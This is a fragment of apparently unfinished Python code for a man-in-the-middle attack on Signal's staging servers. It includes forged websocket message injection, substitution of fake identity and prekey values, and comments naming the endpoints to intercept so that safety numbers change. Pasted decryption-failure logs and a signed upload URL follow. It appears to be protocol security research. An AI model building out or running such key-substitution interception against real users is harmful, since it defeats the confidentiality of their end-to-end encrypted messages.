                ack.ParseFromString(bytes.fromhex("08021a5808f9b4e6cce8a0f4a26f10c8011a024f4b22137b226e6565647353796e63223a66616c73657d2a1d436f6e74656e742d547970653a6170706c69636174696f6e2f6a736f6e2a11436f6e74656e742d4c656e6774683a3139"))
                ack.response.id = proto_msg.request.id
                ctx.log.error(ack.response.id)
                ack_wire = ack.SerializeToString()
                last_message = flow.websocket.messages[-1]
                # if not once:
                #     ctx.master.commands.call("inject.websocket",
                #                             flow,
                #                             last_message.from_client,
                #                             ack_wire,
                #                             False)
                    
                wire_response = response.SerializeToString()
                # ctx.log.warn(f"wire_response {wire_response}")
                # if not once:
                #     ctx.master.commands.call("inject.websocket",
                #                         flow,
                #                         last_message.from_client,
                #                         wire_response,
                #                         False)
                once = True
                
            ## TODO: check if message is PrekeySignal or  SignalMessage
            # atm = AliceToMitm(bob = mitmA)
            # dec_msg = atm.BobReceive(EncodedMessage)
            # print(dec_msg)
            
            ############# COMPLETE HERE Mitm send to Bob
            # mitmB.x3dh(bob_bundle)
            # bob.x3dh(mitmB_bundle)
            # mitmToBob = MitmToBob(alice = mitmB, bob = bob)
            # msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
                #messages.drop()

            
                # other 
#        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
#            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (pNumber, aci, pni));")


### Changes safety number ###
### https://chat.staging.signal.org/v2/keys/signed?identity=pni catch this for new sessions
### /v1/profile catch this for the profile key
### 
# 2023-09-04 22:51:06.392 24005-24124 libsignal               org.thoughtcrime.securesms.staging   W  rust/protocol/src/protocol.rs:152: Bad Mac! Their Mac: 776083faf8d550bf Our Mac: fa5993da96ec897b
# 2023-09-04 22:51:06.396 24005-24124 libsignal               org.thoughtcrime.securesms.staging   W  rust/protocol/src/session_cipher.rs:405: Failed to decrypt PreKey message with ratchet key: 09f6eef69781beb8ce0aaa60af9ba39e44451f0ba62c4617fb7bfabe396bab4d and counter: 0. Session loaded for e7d71aea-c41a-4d88-856b-02e97998863a.1. Local session has base key: 33fa3a4a11f49b3111e2def201f4527b2b6c033b33b14fddd18b2e3fc5a75305 and counter: 0. invalid PreKey message: MAC verification failed
# 2023-09-04 22:51:06.400 24005-24124 libsignal               org.thoughtcrime.securesms.staging   E  rust/protocol/src/session_cipher.rs:504: No valid session for recipient: e7d71aea-c41a-4d88-856b-02e97998863a.1, current session base key 4ab29c95fd3cc11faf7ede2bb273e4aff9e72fc6b7e110f44bde987a13da7b47, number of previous states: 0
# 2023-09-04 22:51:06.402 24005-24124 libsignal               org.thoughtcrime.securesms.staging   E  rust/protocol/src/session_cipher.rs:518: Message from e7d71aea-c41a-4d88-856b-02e97998863a.1 failed to decrypt; sender ratchet public key 09f6eef69781beb8ce0aaa60af9ba39e44451f0ba62c4617fb7bfabe396bab4d message counter 0
#  
# https://cdn2-staging.signal.org/attachments/cwjOYfC-XhwG8HmY0XJb?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=signal-service-staging%40signal-cdn.iam.gserviceaccount.com%2F20230905%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20230905T084119Z&X-Goog-Expires=90000&X-Goog-SignedHeaders=host%3Bx-goog-content-length-range%3Bx-goog-resumable&X-Goog-Signature=8b23ebd65531f23ce136862d7bb39b9d55e66f0f4f39395c053a3e54fa2b28b943789db99d7d96314d8086ecaee332a6029293c9c563b7eb4db7816b438e52f44ba8b88ca4b2eb741cb9d766ac48fa0bbc735abf07d2a729cca91b5061924f550886b4519b967830cc6ab4ea1d2b292eec0b183919dadfb4fde2bbb5413844d30396d298f5a676785f15cb204cbc9229529b9f146b40566829f5bdb716a0c0c3dfae29443420bc91273544b36109db14a3e4f353402ab68bc5c8394478278655ac1fd1dfbfaf72eb9d0a01743b658f29b00b185b5f8e53aaaf0fd003023066bbe67edb0aeffdedfb3bd7fddc5d879fed64d3f7b007db10ef1615a930028fa914&upload_id=ADPycdsk95xDcH5Ho4Lf06FUdacc2bW81PeQxFkvesrAYg_ivZzYBi77sT5_a2OmnkVCsBHKKeR8x1VrtdwNRMbkWXd-beFXKmhG  
# Candidate session 0 failed with 'invalid PreKey message: MAC verification failed', had 0 receiver chains